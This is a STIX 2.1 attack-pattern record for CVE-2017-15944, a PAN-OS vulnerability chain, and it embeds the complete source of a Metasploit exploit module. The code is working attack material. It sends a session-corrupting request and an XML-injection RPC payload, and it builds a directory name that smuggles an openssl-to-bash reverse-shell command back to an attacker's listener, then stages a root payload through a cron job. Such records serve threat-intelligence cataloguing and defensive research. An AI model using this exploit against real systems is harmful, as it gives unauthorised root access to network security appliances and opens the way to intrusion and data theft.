{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--1a8d7bfb-52bc-48a9-801b-7e0849874a1b",
    "created": "2024-08-14T17:01:02.366524Z",
    "modified": "2024-08-14T17:01:02.366528Z",
    "name": "Palo Alto Networks readSessionVarsFromFile() Session Corruption",
    "description": " This module exploits a chain of vulnerabilities in Palo Alto Networks products running PAN-OS versions prior to 6.1.19, 7.0.19, 7.1.14, and 8.0.6. This chain starts by using an authentication bypass flaw to to exploit an XML injection issue, which is then abused to create an arbitrary directory, and finally gains root code execution by exploiting a vulnerable cron script. This module uses an initial reverse TLS callback to stage arbitrary payloads on the target appliance. The cron job used for the final payload runs every 15 minutes by default and exploitation can take up to 20 minutes. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/panos_readsessionvars.rb",
            "external_id": "panos_readsessionvars.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2017-15944"
        },
        {
            "source_name": "reference",
            "url": "https://seclists.org/fulldisclosure/2017/Dec/38"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Palo Alto Networks readSessionVarsFromFile() Session Corruption',\n      'Description'    => %q{\n        This module exploits a chain of vulnerabilities in Palo Alto Networks products running\n        PAN-OS versions prior to 6.1.19, 7.0.19, 7.1.14, and 8.0.6. This chain starts by using\n        an authentication bypass flaw to to exploit an XML injection issue, which is then\n        abused to create an arbitrary directory, and finally gains root code execution by\n        exploiting a vulnerable cron script. This module uses an initial reverse TLS callback\n        to stage arbitrary payloads on the target appliance. The cron job used for the final\n        payload runs every 15 minutes by default and exploitation can take up to 20 minutes.\n      },\n      'Author'         => [\n        'Philip Pettersson <philip.pettersson[at]gmail com>', # Vulnerability discovery\n        'hdm'                                                 # Metasploit module\n      ],\n      'References'     => [\n        ['CVE', '2017-15944'],\n        ['URL', 'https://seclists.org/fulldisclosure/2017/Dec/38'],\n        ['BID', '102079'],\n      ],\n      'DisclosureDate' => '2017-12-11',\n      'License'        => MSF_LICENSE,\n      'Platform'       => 'unix',\n      'Arch'           => ARCH_CMD,\n      'Privileged'     => true,\n      'Payload'        => {'BadChars' => '', 'Space' => 8000, 'DisableNops' => true},\n      'Targets'        => [['Automatic', {}]],\n      'DefaultTarget'  => 0,\n      'DefaultOptions' => {'WfsDelay' => 2}\n    ))\n\n    register_options(\n      [\n        Opt::RPORT(443),\n        OptBool.new('SSL', [true, 'Use SSL', true]),\n        OptAddress.new('CBHOST', [ false, \"The listener address used for staging the real payload\" ]),\n        OptPort.new('CBPORT', [ false, \"The listener port used for staging the real payload\" ])\n      ])\n  end\n\n  def exploit\n\n    # Prefer CBHOST, but use LHOST, or autodetect the IP otherwise\n    cbhost = datastore['CBHOST'] || datastore['LHOST'] || Rex::Socket.source_address(datastore['RHOST'])\n\n    # Start a listener\n    start_listener(true)\n\n    # Figure out the port we picked\n    cbport = self.service.getsockname[2]\n\n    # Set the base directory and the staging payload directory path name\n    base_directory   = \"/opt/pancfg/mgmt/logdb/traffic/1/\"\n    command_payload  = \"* -print -exec bash -c openssl${IFS}s_client${IFS}-quiet${IFS}-connect${IFS}#{cbhost}:#{cbport}|bash ; \"\n    target_directory = base_directory + command_payload\n\n    if target_directory.length > 255\n      print_error(\"The selected payload or options resulted in an encoded command that is too long (255+ bytes)\")\n      return\n    end\n\n    dev_str_1 = Rex::Text.rand_text_alpha_lower(1+rand(10))\n    dev_str_2 = Rex::Text.rand_text_alpha_lower(1+rand(10))\n    user_id   = rand(2000).to_s\n\n    print_status(\"Creating our corrupted session ID...\")\n\n    # Obtain a session cookie linked to a corrupted session file. A raw request\n    # is needed to prevent encoding of the parameters injected into the session\n    res = send_request_raw(\n      'method' => 'GET',\n      'uri'    => \"/esp/cms_changeDeviceContext.esp?device=#{dev_str_1}:#{dev_str_2}%27\\\";user|s.\\\"#{user_id}\\\";\"\n    )\n    unless res\n      print_error('Connection failed')\n      return\n    end\n\n    unless res.body.to_s.index('@start@Success@end@')\n      print_error(\"Unexpected response when creating the corrupted session cookie: #{res.code} #{res.message}\")\n      return\n    end\n\n    cookies = res.get_cookies\n    unless cookies =~ /PHPSESSID=([a-fA-F0-9]+)/\n      print_error(\"Unexpected cookie response when creating the corrupted session cookie: #{res.code} #{res.message} #{cookies}\")\n      return\n    end\n\n    create_directory_tid  = 1 + rand(1000)\n    create_directory_json = JSON.dump({\n      \"action\" => \"PanDirect\",\n      \"method\" => \"execute\",\n      \"data\"   => [\n        Rex::Text.md5(create_directory_tid.to_s),\n        \"Administrator.get\",\n        {\n          \"changeMyPassword\" => true,\n          \"template\"         => Rex::Text.rand_text_alpha_lower(rand(9) + 3),\n          \"id\"               => \"admin']\\\" async-mode='yes' refresh='yes' cookie='../../../../../..#{target_directory}'/>\\x00\"\n        }\n      ],\n      \"type\"   => \"rpc\",\n      \"tid\"    => create_directory_tid\n    })\n\n    print_status(\"Calling Administrator.get to create directory under #{base_directory}...\")\n    res = send_request_cgi(\n      'method' => 'POST',\n      'uri'    => '/php/utils/router.php/Administrator.get',\n      'cookie' => cookies,\n      'ctype'  => \"application/json\",\n      'data'   => create_directory_json\n    )\n\n    unless res\n      print_error('Connection failed')\n      return\n    end\n\n    unless res.body.to_s.index('Async request enqueued')\n      print_error(\"Unexpected response when calling Administrator.get method: #{res.code} #{res.message}\")\n      return\n    end\n\n    register_dirs_for_cleanup(base_directory)\n\n    print_status(\"Waiting up to 20 minutes for the cronjob to fire and execute...\")\n    expiry = Time.at(Time.now.to_i + (60*20)).to_i\n    last_notice = 0\n    while expiry > Time.now.to_i && ! session_created?\n      if last_notice + 30 < Time.now.to_i\n        print_status(\"Waiting for a session, #{expiry - Time.now.to_i} seconds left...\")\n        last_notice = Time.now.to_i\n      end\n      sleep(1)\n    end\n\n    unless session_created?\n      print_error(\"No connection received from the target, giving up.\")\n    end\n\n  end\n\n  def stage_real_payload(cli)\n    print_good(\"Sending payload of #{payload.encoded.length} bytes to #{cli.peerhost}:#{cli.peerport}...\")\n    cli.put(payload.encoded + \"\\n\")\n  end\n\n  def start_listener(ssl = false)\n    comm = datastore['ListenerComm']\n    if comm == \"local\"\n      comm = ::Rex::Socket::Comm::Local\n    else\n      comm = nil\n    end\n\n    self.service = Rex::Socket::TcpServer.create(\n      'LocalPort' => datastore['CBPORT'],\n      'SSL'       => true,\n      'SSLCert'   => datastore['SSLCert'],\n      'Comm'      => comm,\n      'Context'   =>\n        {\n          'Msf'        => framework,\n          'MsfExploit' => self,\n        })\n\n    self.service.on_client_connect_proc = Proc.new { |client|\n      stage_real_payload(client)\n    }\n\n    # Start the listening service\n    self.service.start\n  end\n\n  def cleanup\n    super\n    if self.service\n      print_status(\"Shutting down payload stager listener...\")\n      begin\n        self.service.deref if self.service.kind_of?(Rex::Service)\n        if self.service.kind_of?(Rex::Socket)\n          self.service.close\n          self.service.stop\n        end\n        self.service = nil\n      rescue ::SocketError\n      end\n    end\n  end\n\n  # Accessor for our TCP payload stager\n  attr_accessor :service\n\nend\n",
    "x_mitre_disclosure_date": "2017-12-11",
    "x_mitre_platforms": [
        "unix'"
    ]
}